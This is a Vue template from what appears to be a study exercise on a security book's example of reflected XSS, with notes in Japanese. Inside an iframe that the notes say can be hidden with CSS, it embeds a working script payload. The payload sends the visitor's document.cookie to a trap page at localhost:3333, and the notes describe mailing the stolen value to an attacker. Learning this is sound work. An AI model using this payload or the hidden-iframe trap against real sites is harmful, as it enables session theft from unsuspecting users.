<template>
  <div>
    <div>
      本の91ページのやつ</br>
      以下のiframeはCSSで隠せる
    </div>

    </br>
    <div>
      <p>XSS脆弱性のある下記のページ(localhost:3000/show)にパラメータとして</br>
      <strong>?name=&lt;script&gt;window.location='http://localhost:3333/hoge?sid='%2Bdocument.cookie;&lt;/script&gt;</strong></br>
      をリクエストしている。そのためこのページにアクセスした人はhttp://localhost:3333/hoge?sid=に強制的にリダイレクトさせられ、クッキーの値をクエリとしてリクエストさせられる。</br>
      localhost:3333/hogeも罠サイトでありパラメータの値を攻撃者にメール送信するなどすればアクセスした人のクッキーの値を盗むことができる</p>
      <iframe width=320 height=100 src="http://localhost:3000/show?name=<script>window.location='http://localhost:3333/hoge?sid='%2Bdocument.cookie;</script>"></iframe>
    </div>

    </br>
    <div>
      <p>単純に?name=watanataでアクセスすると下記のようになる</p>
      <iframe width=320 height=100 src="http://localhost:3000/show?name=watanata"></iframe>
    </div>
  </div>

</template>
